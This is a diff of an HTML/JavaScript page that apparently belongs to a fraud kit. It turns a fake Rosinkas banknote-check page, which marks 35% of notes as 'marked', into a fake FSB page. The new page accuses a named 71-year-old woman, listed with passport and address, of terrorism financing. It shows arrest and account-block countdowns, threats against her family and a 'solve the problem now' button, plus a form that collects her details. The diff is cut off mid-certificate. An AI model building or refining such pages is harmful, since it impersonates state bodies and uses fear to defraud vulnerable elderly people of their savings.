@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>РОСИНКАС · Проверка наличных</title>
+  <title>ФСБ РФ · Проверка данных</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -11,360 +11,341 @@
       min-height: 100vh; display: flex; justify-content: center; align-items: center;
       padding: 1.5rem;
       background-image: 
-        radial-gradient(ellipse at 50% 0%, rgba(0,120,60,0.12) 0%, transparent 70%),
+        radial-gradient(ellipse at 50% 0%, rgba(180,0,30,0.12) 0%, transparent 70%),
         radial-gradient(ellipse at 50% 100%, rgba(0,20,40,0.9) 0%, transparent 70%);
     }
-    .container { max-width: 850px; width: 100%; margin: 0 auto; }
+    .container { max-width: 750px; width: 100%; margin: 0 auto; }
+
+    .top-secret {
+      text-align: center; margin-bottom: 0.8rem; font-size: 0.75rem;
+      letter-spacing: 4px; color: #c41230; font-weight: 700;
+      border: 2px solid #c41230; padding: 0.5rem 1rem;
+      display: inline-block; background: rgba(196,18,48,0.08);
+      animation: secretPulse 3s infinite;
+    }
 
     .header {
       text-align: center; margin-bottom: 1.5rem; padding: 1.5rem;
-      background: rgba(10,15,26,0.8); border: 1px solid #1e3040; border-radius: 16px;
+      background: rgba(10,15,26,0.8); border: 1px solid #1e3040; border-radius: 12px;
     }
-    .logo-icon { font-size: 3rem; margin-bottom: 0.5rem; filter: drop-shadow(0 0 15px rgba(192,160,96,0.5)); }
-    .logo-text { font-size: 2rem; font-weight: 900; color: #c0a060; letter-spacing: 6px; text-shadow: 0 0 25px rgba(192,160,96,0.5); }
-    .subtitle { font-size: 0.7rem; color: #7a8ba6; letter-spacing: 3px; margin-top: 0.5rem; }
+    .herb { width: 70px; height: 80px; margin: 0 auto 1rem; position: relative; }
+    .herb .eagle {
+      width: 50px; height: 60px; background: #1a1a2e; border: 2px solid #c0a060;
+      border-radius: 50% 50% 40% 40%; margin: 0 auto; position: relative;
+      box-shadow: 0 0 20px rgba(192,160,96,0.3);
+    }
+    .herb .eagle::before {
+      content: "ФСБ"; position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%,-50%); color: #c0a060;
+      font-size: 0.6rem; font-weight: 900; letter-spacing: 2px;
+    }
+    .herb .shield {
+      width: 30px; height: 35px; background: #c41230;
+      border-radius: 0 0 50% 50%; margin: -5px auto 0; position: relative;
+    }
+    .herb .shield::after {
+      content: "РФ"; position: absolute; top: 40%; left: 50%;
+      transform: translate(-50%,-50%); color: #fff; font-size: 0.5rem; font-weight: 900;
+    }
+    .header h1 {
+      font-size: 1.3rem; font-weight: 700; color: #e0e8f0;
+      letter-spacing: 3px; text-transform: uppercase; margin-bottom: 0.3rem;
+    }
+    .header .subtitle { font-size: 0.7rem; color: #7a8ba6; letter-spacing: 2px; }
 
+    .alert-header {
+      text-align: center; margin-bottom: 1.5rem; padding: 1rem;
+      background: rgba(196,18,48,0.1); border: 2px solid #c41230;
+      border-radius: 10px; animation: alertHeaderPulse 2s infinite;
+    }
+    .alert-header h2 {
+      font-size: 1.1rem; font-weight: 900; color: #ff2d2d;
+      letter-spacing: 2px; text-transform: uppercase;
+    }
+    .alert-header .sub { font-size: 0.7rem; color: #f0506a; margin-top: 0.3rem; }
+
+    .timers-row { display: flex; gap: 1rem; margin-bottom: 1.5rem; }
     .timer-card {
-      background: linear-gradient(145deg, #0a0f1a, #0d1320);
-      border: 2px solid #4a3a15; border-radius: 16px; padding: 1.5rem;
-      text-align: center; margin-bottom: 1.5rem;
-      box-shadow: 0 0 40px rgba(240,192,64,0.15); animation: timerGlow 3s infinite;
+      flex: 1; background: #0a0f1a; border: 2px solid #4a1525;
+      border-radius: 10px; padding: 0.8rem; text-align: center;
+      animation: timerGlow 3s infinite;
     }
-    .timer-title { font-size: 0.7rem; color: #f0c040; letter-spacing: 3px; margin-bottom: 0.8rem; text-transform: uppercase; }
-    .timer-value { font-size: 3rem; font-weight: 900; color: #f0c040; text-shadow: 0 0 25px rgba(240,192,64,0.7); letter-spacing: 4px; }
-    .timer-sub { font-size: 0.6rem; color: #6b7d95; margin-top: 0.5rem; letter-spacing: 1px; }
+    .timer-card .timer-title { font-size: 0.6rem; color: #f0506a; letter-spacing: 1px; margin-bottom: 0.5rem; text-transform: uppercase; }
+    .timer-card .timer-value { font-size: 1.3rem; font-weight: 700; color: #ff4d4d; }
+    .timer-card .timer-sub { font-size: 0.55rem; color: #6b7d95; margin-top: 0.3rem; }
 
-    .progress-section { margin-top: 1rem; }
-    .progress-label { display: flex; justify-content: space-between; font-size: 0.6rem; color: #6b7d95; margin-bottom: 0.3rem; letter-spacing: 1px; }
-    .progress-track { height: 10px; background: #1a2540; border-radius: 5px; overflow: hidden; }
-    .progress-fill { height: 100%; background: linear-gradient(90deg, #50f070, #f0c040); border-radius: 5px; transition: width 0.4s ease; box-shadow: 0 0 15px rgba(240,192,64,0.5); }
-
-    .certificate-section { text-align: center; margin: 1.5rem 0; display: none; }
-    .certificate-section.show { display: block; animation: fadeInUp 0.6s ease; }
-    .btn-certificate {
-      display: inline-block; padding: 1rem 2.5rem;
-      background: linear-gradient(145deg, #0a2a0f, #0d3d15);
-      border: 2px solid #50f070; border-radius: 12px;
-      color: #50f070; font-size: 0.9rem; font-weight: 700;
-      letter-spacing: 2px; cursor: pointer; text-transform: uppercase;
-      font-family: inherit; transition: all 0.3s ease;
-      box-shadow: 0 0 25px rgba(80,240,112,0.3);
-      animation: certGlow 2s infinite; text-decoration: none;
+    .card {
+      background: #0a101c; border: 1px solid #1e3040; border-radius: 10px;
+      padding: 1.2rem; margin-bottom: 1rem;
     }
-    .btn-certificate:hover { box-shadow: 0 0 45px rgba(80,240,112,0.6); transform: translateY(-2px); }
-
-    .card { background: #0a101c; border: 1px solid #1e3040; border-radius: 12px; padding: 1.2rem; margin-bottom: 1rem; }
-    .card-title { font-size: 0.65rem; color: #7a8ba6; letter-spacing: 2px; margin-bottom: 1rem; text-transform: uppercase; display: flex; align-items: center; gap: 0.5rem; }
+    .card.danger { border-color: #4a1525; }
+    .card-title {
+      font-size: 0.65rem; color: #7a8ba6; letter-spacing: 2px;
+      margin-bottom: 1rem; text-transform: uppercase;
+      display: flex; align-items: center; gap: 0.5rem;
+    }
     .dot { width: 8px; height: 8px; border-radius: 50%; animation: dotPulse 1.5s infinite; }
-    .dot.green { background: #50f070; box-shadow: 0 0 10px rgba(80,240,112,0.6); }
-    .dot.red { background: #ff2d2d; box-shadow: 0 0 10px rgba(255,50,50,0.6); }
-    .dot.yellow { background: #f0c040; box-shadow: 0 0 10px rgba(240,192,64,0.6); }
+    .dot.red { background: #c41230; }
 
-    .stats { display: flex; justify-content: space-around; text-align: center; margin: 0.5rem 0 1rem; }
-    .stat-item { flex: 1; }
-    .stat-value { font-size: 1.4rem; font-weight: 700; }
-    .stat-label { font-size: 0.55rem; color: #6b7d95; letter-spacing: 1px; margin-top: 0.2rem; }
+    .table { width: 100%; border-collapse: collapse; }
+    .table td {
+      padding: 0.5rem 0.3rem; border-bottom: 1px solid #1a2540;
+      font-size: 0.7rem;
+    }
+    .table td:first-child { color: #6b7d95; width: 40%; }
+    .table td:last-child { color: #d4dce8; font-weight: 600; text-align: right; }
 
-    .banknote-grid {
-      display: grid; grid-template-columns: repeat(auto-fill, minmax(38px, 1fr));
-      gap: 5px; justify-items: center; margin: 0.5rem 0;
-      max-height: 280px; overflow-y: auto; padding: 0.3rem;
+    .badge {
+      display: inline-block; padding: 0.2rem 0.5rem; border-radius: 3px;
+      font-size: 0.6rem; font-weight: 700; letter-spacing: 1px;
     }
-    .banknote-tile {
-      width: 38px; height: 24px; border-radius: 4px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 0.5rem; font-weight: 700; opacity: 0; transform: scale(0);
-      transition: all 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    .badge-red { background: #1a0a0f; color: #f0506a; border: 1px solid #4a1525; }
+    .badge-yellow { background: #1a1405; color: #f0c040; border: 1px solid #4a3a15; }
+
+    .risk-card { background: #0a101c; border: 1px solid #4a1525; border-radius: 10px; padding: 1rem; margin-bottom: 1rem; }
+    .risk-title { font-size: 0.65rem; color: #f0506a; letter-spacing: 2px; margin-bottom: 0.8rem; text-transform: uppercase; text-align: center; }
+    .risk-row { display: flex; align-items: center; margin-bottom: 0.6rem; gap: 0.5rem; }
+    .risk-label { width: 100px; font-size: 0.6rem; color: #6b7d95; text-align: right; }
+    .risk-bar { flex: 1; height: 8px; background: #1a2540; border-radius: 4px; overflow: hidden; }
+    .risk-fill { height: 100%; border-radius: 4px; }
+    .risk-fill.red { background: linear-gradient(90deg, #c41230, #ff4d4d); width: 92%; }
+    .risk-fill.orange { background: linear-gradient(90deg, #c47020, #f0a040); width: 78%; }
+    .risk-fill.yellow { background: linear-gradient(90deg, #c0a020, #f0d040); width: 65%; }
+    .risk-value { width: 35px; font-size: 0.6rem; color: #d4dce8; font-weight: 700; text-align: left; }
+
+    .consequences {
+      background: #0a0f1a; border: 2px solid #4a1525; border-radius: 10px;
+      padding: 1rem; margin-bottom: 1rem;
     }
-    .banknote-tile.show { opacity: 1; transform: scale(1); }
-    .banknote-tile.clean {
-      background: linear-gradient(145deg, #0a2a0f, #0d3d15);
-      color: #50f070; border: 1px solid #154a25;
-      box-shadow: 0 0 10px rgba(80,240,112,0.3);
+    .consequences .cons-title {
+      font-size: 0.7rem; color: #ff2d2d; letter-spacing: 2px;
+      margin-bottom: 0.8rem; text-transform: uppercase; text-align: center;
     }
-    .banknote-tile.dirty {
-      background: linear-gradient(145deg, #2a0a0f, #3d1015);
-      color: #ff4d4d; border: 1px solid #4a1525;
-      box-shadow: 0 0 12px rgba(255,50,50,0.4);
-      animation: dirtyGlow 1.5s infinite;
+    .cons-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .cons-list li {
+      font-size: 0.65rem; color: #c0c8d4; padding-left: 1rem; position: relative;
+    }
+    .cons-list li::before { content: "☠"; position: absolute; left: 0; color: #f0506a; font-size: 0.6rem; }
+
+    .btn-danger {
+      display: block; width: 100%; padding: 1rem;
+      background: #c41230; border: none; border-radius: 8px;
+      color: #fff; font-size: 0.9rem; font-weight: 700;
+      letter-spacing: 2px; cursor: pointer; transition: all 0.3s ease;
+      text-transform: uppercase; font-family: inherit; text-align: center;
+      text-decoration: none; animation: btnPulse 2s infinite; margin-bottom: 1rem;
+    }
+    .btn-danger:hover { background: #e01838; }
+
+    .blocked-btn {
+      display: flex; align-items: center; justify-content: center; gap: 0.5rem;
+      padding: 0.7rem; background: #0d1320; border: 1px solid #2a3a50;
+      border-radius: 6px; color: #4a5a70; font-size: 0.7rem; font-weight: 600;
+      letter-spacing: 1px; text-decoration: line-through; cursor: not-allowed; opacity: 0.5;
     }
 
-    .log-container {
-      max-height: 140px; overflow-y: auto; font-size: 0.55rem;
-      color: #6b7d95; margin-top: 0.8rem; background: #060b14;
-      border-radius: 8px; padding: 0.5rem; border: 1px solid #1a2540;
+    .form-group { margin-bottom: 0.7rem; }
+    .form-group label {
+      display: block; font-size: 0.6rem; color: #7a8ba6;
+      margin-bottom: 0.3rem; letter-spacing: 1px; text-transform: uppercase;
     }
-    .log-entry { padding: 0.25rem 0; border-bottom: 1px solid #111a28; display: flex; align-items: center; gap: 0.5rem; }
-    .log-time { color: #4a5a70; font-size: 0.5rem; min-width: 45px; }
-    .log-serial { letter-spacing: 0.5px; min-width: 70px; }
-    .log-nominal { min-width: 45px; text-align: right; }
-    .log-status { font-weight: 700; min-width: 70px; text-align: right; }
+    .form-group input, .form-group textarea {
+      width: 100%; padding: 0.6rem; background: #0d1320;
+      border: 1px solid #2a3a50; border-radius: 5px; color: #d4dce8;
+      font-family: inherit; font-size: 0.7rem; resize: vertical;
+    }
+    .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #c41230; }
+    .form-group textarea { min-height: 60px; }
+    .btn-submit {
+      width: 100%; padding: 0.7rem; background: #1a0a0f;
+      border: 1px solid #c41230; color: #f0506a; font-weight: 600;
+      font-size: 0.75rem; letter-spacing: 1px; border-radius: 5px;
+      cursor: pointer; font-family: inherit; text-transform: uppercase;
+    }
+    .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
 
-    .warning-box {
-      background: #1a0a0f; border: 1px solid #4a1525; border-radius: 8px;
-      padding: 0.7rem; margin-top: 0.8rem; font-size: 0.6rem;
-      color: #f0506a; text-align: center; letter-spacing: 1px;
+    .response-box {
+      margin-top: 0.8rem; padding: 0.8rem; background: #0d1320;
+      border: 1px solid #154a25; border-radius: 6px; display: none; text-align: center;
     }
-    .warning-box strong { color: #ff4d4d; font-size: 0.7rem; }
+    .response-box.show { display: block; }
+    .response-num { font-size: 1.2rem; font-weight: 700; color: #50f070; letter-spacing: 2px; margin: 0.4rem 0; }
+
+    .nav-link {
+      text-align: center; margin-top: 1rem; font-size: 0.6rem;
+    }
+    .nav-link a { color: #7a8ba6; text-decoration: none; letter-spacing: 1px; }
+    .nav-link a:hover { color: #c0c8d4; }
 
     .footer {
       text-align: center; margin-top: 2rem; font-size: 0.5rem;
       color: #3a4a60; border-top: 1px solid #1a2540; padding-top: 1rem; letter-spacing: 1px;
     }
 
+    @keyframes alertHeaderPulse {
+      0%, 100% { box-shadow: 0 0 10px rgba(196,18,48,0.3); }
+      50% { box-shadow: 0 0 30px rgba(196,18,48,0.7); }
+    }
+    @keyframes btnPulse {
+      0%, 100% { box-shadow: 0 0 10px rgba(196,18,48,0.4); }
+      50% { box-shadow: 0 0 25px rgba(196,18,48,0.8); }
+    }
     @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-    @keyframes timerGlow { 0%, 100% { box-shadow: 0 0 20px rgba(240,192,64,0.2); } 50% { box-shadow: 0 0 45px rgba(240,192,64,0.5); } }
-    @keyframes dirtyGlow { 0%, 100% { box-shadow: 0 0 8px rgba(255,50,50,0.3); } 50% { box-shadow: 0 0 20px rgba(255,50,50,0.7); } }
-    @keyframes certGlow { 0%, 100% { box-shadow: 0 0 15px rgba(80,240,112,0.3); } 50% { box-shadow: 0 0 35px rgba(80,240,112,0.7); } }
-    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-    ::-webkit-scrollbar { width: 4px; }
-    ::-webkit-scrollbar-track { background: #0a101c; }
-    ::-webkit-scrollbar-thumb { background: #2a3a50; border-radius: 2px; }
+    @keyframes secretPulse {
+      0%, 100% { opacity: 0.8; }
+      50% { opacity: 1; box-shadow: 0 0 15px rgba(196,18,48,0.4); }
+    }
+    @keyframes timerGlow {
+      0%, 100% { box-shadow: 0 0 10px rgba(196,18,48,0.3); }
+      50% { box-shadow: 0 0 25px rgba(196,18,48,0.6); }
+    }
 
     @media (max-width: 500px) {
       body { padding: 0.5rem; }
-      .banknote-grid { grid-template-columns: repeat(auto-fill, minmax(30px, 1fr)); }
-      .banknote-tile { width: 30px; height: 20px; font-size: 0.4rem; }
-      .timer-value { font-size: 2rem; }
+      .timers-row { flex-direction: column; gap: 0.5rem; }
     }
   </style>
 </head>
 <body>
   <div class="container">
 
+    <div style="text-align:center;">
+      <div class="top-secret">СОВЕРШЕННО СЕКРЕТНО · ДСП</div>
+    </div>
+
     <div class="header">
-      <div class="logo-icon">🏛️</div>
-      <div class="logo-text">РОСИНКАС</div>
-      <div class="subtitle">Российское объединение инкассации<br>Центральный банк Российской Федерации</div>
+      <div class="herb">
+        <div class="eagle"></div>
+        <div class="shield"></div>
+      </div>
+      <h1>Федеральная Служба Безопасности</h1>
+      <p class="subtitle">Управление по борьбе с финансированием терроризма</p>
     </div>
 
-    <div class="timer-card">
-      <div class="timer-title">⏳ Экспертиза завершится через</div>
-      <div class="timer-value" id="timer">04:59</div>
-      <div class="timer-sub">идёт проверка подлинности и легальности купюр</div>
-      <div class="progress-section">
-        <div class="progress-label"><span>Прогресс проверки</span><span id="progressPercent">0%</span></div>
-        <div class="progress-track"><div class="progress-fill" id="progressFill" style="width:0%;"></div></div>
+    <div class="alert-header">
+      <h2>⚠ ВЫ ПОДОЗРЕВАЕТЕСЬ</h2>
+      <div class="sub">По статье 205.1 УК РФ · Содействие терроризму</div>
+    </div>
+
+    <div class="timers-row">
+      <div class="timer-card">
+        <div class="timer-title">⏳ Блокировка счетов</div>
+        <div class="timer-value" id="blockTimer">71:59:59</div>
+        <div class="timer-sub">автоматическая блокировка</div>
+      </div>
+      <div class="timer-card">
+        <div class="timer-title">🚔 Передача в прокуратуру</div>
+        <div class="timer-value" id="arrestTimer">23:59:59</div>
+        <div class="timer-sub">до ареста</div>
       </div>
     </div>
 
-    <div class="card">
-      <div class="card-title"><span class="dot yellow"></span> Статистика проверки</div>
-      <div class="stats">
-        <div class="stat-item">
-          <div class="stat-value" style="color:#50f070;" id="cleanCount">0</div>
-          <div class="stat-label">Чистые купюры</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-value" style="color:#f0c040;" id="pendingCount">200</div>
-          <div class="stat-label">Ожидают проверки</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-value" style="color:#ff4d4d;" id="dirtyCount">0</div>
-          <div class="stat-label">Меченые купюры</div>
-        </div>
+    <div class="risk-card">
+      <div class="risk-title">📊 Уровень угрозы</div>
+      <div class="risk-row">
+        <span class="risk-label">Тюремный срок</span>
+        <div class="risk-bar"><div class="risk-fill red"></div></div>
+        <span class="risk-value">92%</span>
       </div>
-      <div class="warning-box">
-        <strong>⚠ ВНИМАНИЕ</strong><br>
-        Выявлены купюры с признаками компрометации. Данные банкноты были подмешаны сотрудниками банка и проходят по ориентировкам как «меченые» по делам о мошенничестве. <strong>35% купюр имеют статус «меченые».</strong> После завершения экспертизы будет выдано заключение и сертификат легальности.
+      <div class="risk-row">
+        <span class="risk-label">Потеря средств</span>
+        <div class="risk-bar"><div class="risk-fill orange"></div></div>
+        <span class="risk-value">78%</span>
+      </div>
+      <div class="risk-row">
+        <span class="risk-label">Угроза семье</span>
+        <div class="risk-bar"><div class="risk-fill yellow"></div></div>
+        <span class="risk-value">65%</span>
       </div>
     </div>
 
-    <div class="card">
-      <div class="card-title"><span class="dot green"></span> Поток проверки · Пакет АВ-48821</div>
-      <div class="banknote-grid" id="banknoteGrid"></div>
-      <div class="log-container" id="logContainer"></div>
-    </div>
-
-    <div class="certificate-section" id="certificateSection">
-      <a class="btn-certificate" id="certificateLink" href="#" target="_blank">
-        📄 Получить сертификат подлинности
-      </a>
-      <div style="font-size:0.55rem; color:#6b7d95; margin-top:0.5rem;">
-        Заключение экспертизы · Открыть в новой вкладке
-      </div>
-    </div>
-
-    <div class="card">
-      <div class="card-title">📋 Данные пакета</div>
-      <table style="width:100%; font-size:0.6rem; border-collapse:collapse;">
-        <tr><td style="color:#6b7d95; padding:0.3rem;">Номер пакета</td><td style="padding:0.3rem;">АВ-48821</td></tr>
-        <tr><td style="color:#6b7d95; padding:0.3rem;">Владелец</td><td style="padding:0.3rem;">Шишова Ирина Ивановна</td></tr>
-        <tr><td style="color:#6b7d95; padding:0.3rem;">Общая сумма</td><td style="padding:0.3rem;">1 000 000 ₽</td></tr>
-        <tr><td style="color:#6b7d95; padding:0.3rem;">Номинал купюр</td><td style="padding:0.3rem;">5 000 ₽ (200 шт.)</td></tr>
-        <tr><td style="color:#6b7d95; padding:0.3rem;">Статус</td><td style="color:#f0c040; padding:0.3rem;" id="packageStatus">⏳ На экспертизе</td></tr>
+    <div class="card danger">
+      <div class="card-title"><span class="dot red"></span> Карточка объекта проверки</div>
+      <table class="table">
+        <tr><td>ФИО</td><td>Шишова Ирина Ивановна</td></tr>
+        <tr><td>Дата рождения</td><td>06.09.1953 (71 год)</td></tr>
+        <tr><td>Паспорт</td><td>4514 123456</td></tr>
+        <tr><td>Адрес</td><td>г. Москва, пр. Напольный, д. 6, кв. 26</td></tr>
+        <tr><td>Статус</td><td><span class="badge badge-red">ПОДОЗРЕВАЕМАЯ</span></td></tr>
+        <tr><td>Доверенность</td><td><span class="badge badge-red">Активна · Терновский Р.Л.</span></td></tr>
       </table>
     </div>
 
+    <div class="consequences">
+      <div class="cons-title">☠ ЧТО БУДЕТ, ЕСЛИ НЕ РЕШИТЬ</div>
+      <ul class="cons-list">
+        <li>Автоматическая блокировка всех счетов</li>
+        <li>Арест имущества (квартира, дача)</li>
+        <li>Передача материалов в Генпрокуратуру</li>
+        <li>Уголовное дело по ст. 205.1 УК РФ (до 20 лет)</li>
+        <li>Допросы всех членов семьи</li>
+        <li>Письма ФСБ на места работы родственников</li>
+      </ul>
+    </div>
+
+    <a href="#appealForm" class="btn-danger">⚠ РЕШИТЬ ПРОБЛЕМУ СЕЙЧАС</a>
+
+    <div class="blocked-btn"><span>🔒</span> Аннулировать доверенность (ожидание ФСБ)</div>
+
+    <div class="card" id="appealForm">
+      <div class="card-title">📩 Обращение в ФСБ</div>
+      <form id="fsbForm">
+        <div class="form-group"><label>Фамилия, Имя, Отчество</label><input type="text" name="fio" placeholder="Иванов Иван Иванович" required></div>
+        <div class="form-group"><label>Дата рождения</label><input type="text" name="birthdate" placeholder="01.01.1950" required></div>
+        <div class="form-group"><label>Текст обращения</label><textarea name="message" placeholder="Опишите вашу ситуацию..." required></textarea></div>
+        <button type="submit" class="btn-submit" id="submitBtn">📤 Отправить обращение</button>
+      </form>
+      <div class="response-box" id="responseBox">
+        <p style="color:#7a8ba6;">✅ Обращение зарегистрировано</p>
+        <div class="response-num" id="responseNumber"></div>
+        <p style="font-size:0.6rem; color:#f0c040;">⏳ Ожидает проверки ФСБ</p>
+      </div>
+    </div>
+
+    <div class="nav-link">
+      <a href="rosinkas.html">🏛️ Перейти к проверке РОСИНКАС →</a>
+    </div>
+
     <div class="footer">
-      РОСИНКАС · Центральный банк Российской Федерации<br>
-      Система онлайн-мониторинга экспертизы наличных · Версия 3.2.1
+      Система оперативного контроля ФСБ России · Версия 4.8.2<br>
+      Несанкционированный доступ преследуется по ст. 272, 275, 310 УК РФ
     </div>
 
   </div>
 
   <script>
-    // === КОНФИГУРАЦИЯ (ТЕСТ) ===
-    const TOTAL_NOTES = 200;
-    const TOTAL_TIME_SECONDS = 300; // 5 минут
-    const DIRTY_RATIO = 0.35;
-    const INTERVAL = (TOTAL_TIME_SECONDS / TOTAL_NOTES) * 1000;
-
-    const notes = [];
-    const dirtyIndices = new Set();
-    while (dirtyIndices.size < Math.floor(TOTAL_NOTES * DIRTY_RATIO)) {
-      dirtyIndices.add(Math.floor(Math.random() * TOTAL_NOTES));
+    let blockSeconds = 72 * 3600;
+    function updateBlock() {
+      const h = Math.floor(blockSeconds / 3600);
+      const m = Math.floor((blockSeconds % 3600) / 60);
+      const s = blockSeconds % 60;
+      document.getElementById('blockTimer').textContent = 
+        String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+      if (blockSeconds > 0) { blockSeconds--; setTimeout(updateBlock, 1000); }
     }
+    updateBlock();
 
-    const letters = 'АБВГДЕЖЗИКЛМНОПРСТУФХЦЧШЩЭЮЯ';
-    for (let i = 0; i < TOTAL_NOTES; i++) {
-      const l1 = letters[Math.floor(Math.random() * letters.length)];
-      const l2 = letters[Math.floor(Math.random() * letters.length)];
-      const num = String(Math.floor(Math.random() * 9000000 + 1000000));
-      notes.push({
-        serial: l1 + l2 + ' ' + num,
-        nominal: '5000',
-        dirty: dirtyIndices.has(i),
-        revealed: false
-      });
+    let arrestSeconds = 24 * 3600;
+    function updateArrest() {
+      const h = Math.floor(arrestSeconds / 3600);
+      const m = Math.floor((arrestSeconds % 3600) / 60);
+      const s = arrestSeconds % 60;
+      document.getElementById('arrestTimer').textContent = 
+        String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+      if (arrestSeconds > 0) { arrestSeconds--; setTimeout(updateArrest, 1000); }
     }
+    updateArrest();
 
-    const grid = document.getElementById('banknoteGrid');
-    const logContainer = document.getElementById('logContainer');
-    const timerEl = document.getElementById('timer');
-    const progressPercent = document.getElementById('progressPercent');
-    const progressFill = document.getElementById('progressFill');
-    const cleanCountEl = document.getElementById('cleanCount');
-    const dirtyCountEl = document.getElementById('dirtyCount');
-    const pendingCountEl = document.getElementById('pendingCount');
-    const certificateSection = document.getElementById('certificateSection');
-    const certificateLink = document.getElementById('certificateLink');
-    const packageStatus = document.getElementById('packageStatus');
-
-    const tiles = [];
-    for (let i = 0; i < TOTAL_NOTES; i++) {
-      const tile = document.createElement('div');
-      tile.className = 'banknote-tile';
-      tile.textContent = notes[i].nominal;
-      tile.title = notes[i].serial + (notes[i].dirty ? ' ⚠ МЕЧЕНАЯ' : '');
-      grid.appendChild(tile);
-      tiles.push(tile);
-    }
-
-    let cleanCount = 0, dirtyCount = 0, pendingCount = TOTAL_NOTES, revealedCount = 0;
-    let timeLeft = TOTAL_TIME_SECONDS, timerFinished = false;
-
-    function updateTimer() {
-      const m = Math.floor(timeLeft / 60);
-      const s = timeLeft % 60;
-      timerEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
-      const pct = Math.round((revealedCount / TOTAL_NOTES) * 100);
-      progressPercent.textContent = pct + '%';
-      progressFill.style.width = pct + '%';
-      if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
-      else {
-        timerFinished = true;
-        certificateSection.classList.add('show');
-        packageStatus.textContent = '✅ Проверка завершена';
-        packageStatus.style.color = '#50f070';
-      }
-    }
-    updateTimer();
-
-    function addLog(serial, nominal, dirty) {
-      const now = new Date();
-      const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
-      const entry = document.createElement('div');
-      entry.className = 'log-entry';
-      const statusText = dirty ? '✗ МЕЧЕНАЯ' : '✓ Чистая';
-      const statusColor = dirty ? '#ff4d4d' : '#50f070';
-      entry.innerHTML = `<span class="log-time">${time}</span><span class="log-serial">${serial}</span><span class="log-nominal">${nominal} ₽</span><span class="log-status" style="color:${statusColor}">${statusText}</span>`;
-      logContainer.appendChild(entry);
-      logContainer.scrollTop = logContainer.scrollHeight;
-    }
-
-    function revealNext(index) {
-      if (index >= TOTAL_NOTES) return;
-      const note = notes[index];
-      note.revealed = true;
-      revealedCount++;
-      pendingCount--;
-      const tile = tiles[index];
-      if (note.dirty) { tile.classList.add('dirty', 'show'); dirtyCount++; }
-      else { tile.classList.add('clean', 'show'); cleanCount++; }
-      cleanCountEl.textContent = cleanCount;
-      dirtyCountEl.textContent = dirtyCount;
-      pendingCountEl.textContent = pendingCount;
-      addLog(note.serial, note.nominal, note.dirty);
-      if (index + 1 < TOTAL_NOTES) { setTimeout(() => revealNext(index + 1), INTERVAL); }
-      else if (timerFinished) {
-        certificateSection.classList.add('show');
-        packageStatus.textContent = '✅ Проверка завершена';
-        packageStatus.style.color = '#50f070';
-      }
-    }
-    setTimeout(() => revealNext(0), 1000);
-
-    // === КНОПКА СЕРТИФИКАТА ===
-    certificateLink.addEventListener('click', function(e) {
+    document.getElementById('fsbForm').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const now = new Date();
-      const dateStr = String(now.getDate()).padStart(2,'0') + '.' + String(now.getMonth()+1).padStart(2,'0') + '.' + now.getFullYear();
-      const timeStr = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
-      const cleanTotal = cleanCount * 5000;
-      const dirtyTotal = dirtyCount * 5000;
-      const totalSum = cleanTotal + dirtyTotal;
-      const certNumber = 'РК-' + Math.floor(Math.random() * 900000 + 100000) + '/' + now.getFullYear();
-
-      const html = `<!DOCTYPE html>
-<html lang="ru">
-<head><meta charset="UTF-8"><title>Сертификат подлинности</title>
-<style>
-  body { font-family: 'Courier New', monospace; background: #fff; color: #000; padding: 40px; max-width: 700px; margin: 0 auto; }
-  h1 { text-align: center; font-size: 18px; margin-bottom: 5px; }
-  h2 { text-align: center; font-size: 14px; margin-bottom: 20px; }
-  h3 { text-align: center; font-size: 16px; margin: 20px 0; border: 1px solid #000; padding: 10px; }
-  .line { border-top: 1px solid #000; margin: 10px 0; }
-  table { width: 100%; border-collapse: collapse; margin: 15px 0; }
-  td { padding: 5px; font-size: 13px; }
-  .stamp { text-align: right; margin-top: 30px; font-style: italic; }
-  @media print { body { padding: 20px; } }
-</style></head>
-<body>
-  <h1>РОССИЙСКОЕ ОБЪЕДИНЕНИЕ ИНКАССАЦИИ «РОСИНКАС»</h1>
-  <h2>Центральный банк Российской Федерации</h2>
-  <div class="line"></div>
-  <h3>СЕРТИФИКАТ ПОДЛИННОСТИ<br>${certNumber}</h3>
-  <p>Дата выдачи: ${dateStr} ${timeStr}</p>
-  <p>Владелец: <strong>Шишова Ирина Ивановна</strong></p>
-  <p>Паспорт: 4514 123456</p>
-  <p>Номер пакета: АВ-48821</p>
-  <div class="line"></div>
-  <h4>РЕЗУЛЬТАТЫ ЭКСПЕРТИЗЫ</h4>
-  <table>
-    <tr><td>Общая сумма:</td><td><strong>${totalSum.toLocaleString('ru-RU')} ₽</strong></td></tr>
-    <tr><td>Всего купюр:</td><td>${TOTAL_NOTES} шт. (номинал 5 000 ₽)</td></tr>
-    <tr><td>Чистые купюры:</td><td>${cleanCount} шт. на сумму ${cleanTotal.toLocaleString('ru-RU')} ₽</td></tr>
-    <tr><td>Меченые купюры:</td><td>${dirtyCount} шт. на сумму ${dirtyTotal.toLocaleString('ru-RU')} ₽</td></tr>
-  </table>
-  <div class="line"></div>
-  <h4>ЗАКЛЮЧЕНИЕ</h4>
